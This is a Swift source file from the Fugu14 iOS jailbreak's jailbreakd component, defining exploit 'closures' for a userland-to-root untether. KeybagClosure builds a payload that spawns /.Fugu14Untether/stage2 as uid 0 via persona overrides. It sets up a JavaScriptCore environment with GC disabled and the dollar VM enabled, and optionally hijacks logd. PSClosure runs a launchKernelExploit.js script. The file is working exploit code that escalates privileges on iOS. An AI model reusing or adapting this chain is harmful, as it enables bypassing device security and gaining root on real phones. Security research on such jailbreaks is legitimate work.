//
//  closures.swift
//  jailbreakd
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//

import Foundation
import ClosurePwn
import JailbreakUtils

class KeybagClosure: PwnClosure {
    public var fastUntether = false
    
    override init(name: String = "Something") throws {
        try super.init(name: name)
        
        noprint = true
    }
    
    override func generatePayload() throws -> ClosureMemoryObject {
        let attr = try pool.getStrRef("ABCDEFGH")
        try callCFunc(name: "posix_spawnattr_init", arguments: [
            attr
        ]).insertNow()
        try callCFunc(name: "posix_spawnattr_set_persona_np", arguments: [
            attr,
            .absolute(address: 99),
            .absolute(address: 1) // POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE
        ]).insertNow()
        try callCFunc(name: "posix_spawnattr_set_persona_uid_np", arguments: [
            attr,
            .absolute(address: 0)
        ]).insertNow()
        try callCFunc(name: "posix_spawnattr_set_persona_gid_np", arguments: [
            attr,
            .absolute(address: 0)
        ]).insertNow()
        
        let execPath = try pool.getStrRef("/.Fugu14Untether/stage2")
        
        let argv = try pool.makeMemoryObject(size: 16, data: [
            .init(offset: 0, target: execPath),
            .init(offset: 8, target: .absolute(address: 0)),
        ])
        
        let homeVal = try pool.getStrRef("HOME=" + untetherContainerPath)
        let disableGC = try pool.getStrRef("JSC_useGC=0")
        let allowVM = try pool.getStrRef("JSC_useDollarVM=1")
        let path = try pool.getStrRef("JAILBREAKD_PATH=/.Fugu14Untether/jailbreakd")
        let arg = try pool.getStrRef("JAILBREAKD_ARG=untether")
        let cdhash = try pool.getStrRef("JAILBREAKD_CDHASH=" + String(cString: getenv("JAILBREAKD_CDHASH")))
        
        let env = try pool.makeMemoryObject(size: 56, data: [
            .init(offset: 0, target: homeVal),
            .init(offset: 8, target: disableGC),
            .init(offset: 16, target: allowVM),
            .init(offset: 24, target: path),
            .init(offset: 32, target: arg),
            .init(offset: 40, target: cdhash),
            .init(offset: 48, target: .absolute(address: 0)),
        ])
        
        let pidBuf = try pool.getStrRef("XXXXXXXX")
        try callCFunc(name: "posix_spawn", arguments: [
            pidBuf,
            execPath,
            .absolute(address: 0),
            attr,
            argv.reference,
            env.reference
        ]).insertNow()
        
        if fastUntether {
            let homeStr = try pool.getStrRef("HOME")
            let homePath = try pool.getStrRef("/var/db/diagnostics")
            try callCFunc(name: "setenv", arguments: [
                homeStr,
                homePath,
                .absolute(address: 1)
            ]).insertNow()
            
            let origLogd = try pool.getStrRef("/usr/libexec/logd")
            let argv_logd = try pool.makeMemoryObject(size: 16, data: [
                .init(offset: 0, target: origLogd),
                .init(offset: 8, target: .absolute(address: 0))
            ])
            
            let realLogd = try pool.getStrRef("/usr/libexec/logd.back")
            try callCFunc(name: "execv", arguments: [
                realLogd,
                argv_logd.reference
            ]).insertNow()
            
            try callCFunc(name: "exit", arguments: [
                .absolute(address: 99)
            ]).insertNow()
        } else {
            try callCFunc(name: "wait", arguments: [
                pidBuf
            ]).insertNow()
            
            try callCFunc(name: "exit", arguments: [
                .absolute(address: 99)
            ]).insertNow()
        }
        
        return try super.generatePayload()
    }
}

class PSClosure: GenericJSClosure {
    override init(name: String = "Something") throws {
        try super.init(name: name)
        
        noprint = true
    }
    
    override func generatePayload() throws -> ClosureMemoryObject {
        try initJSRuntime(utilsPath: "/.Fugu14Untether/utils.js", setupPath: "/.Fugu14Untether/setup.js")
        
        try runJSFile(path: "/.Fugu14Untether/launchKernelExploit.js")
        
        try callCFunc(name: "exit", arguments: [
            .absolute(address: 1)
        ]).insertNow()
        
        return try super.generatePayload()
    }
}
